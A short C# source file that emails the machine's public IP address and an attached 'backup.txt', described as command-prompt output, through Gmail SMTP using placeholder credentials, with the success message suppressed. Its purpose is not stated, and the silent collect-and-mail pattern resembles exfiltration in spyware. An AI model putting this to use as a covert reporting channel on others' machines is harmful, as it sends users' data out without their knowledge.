using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Diagnostics;
using System.Windows.Forms;
using ObterIp;

namespace Email
{
    public class EnviarEmail
    {
        Stopwatch Stop = new Stopwatch();

        public static void enviarEmailIp()
        {
            try
            {
                MailMessage Email = new MailMessage();

                Email.To.Add(new MailAddress("email"));
                Email.From = (new MailAddress("email"));
                Email.Subject = "IP - Anexo .txt";
                Email.IsBodyHtml = true;

                Email.Body = "Segue anexo com o .txt com os dados do cmd."
                +"\n IP Externo: "+Ip.GetPublicIP();

                Email.Attachments.Add(new Attachment("backup.txt"));

                //SmtpClient cliente = new SmtpClient("smtp.live.com", 587);

                SmtpClient cliente = new SmtpClient("smtp.gmail.com",587);

                using (cliente)
                {
                    cliente.Credentials = new System.Net.NetworkCredential("email", "senha");
                    cliente.EnableSsl = true;
                    cliente.Send(Email);
                }

                //MessageBox.Show("Email enviado com sucesso!!", "Email - Enviado!");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
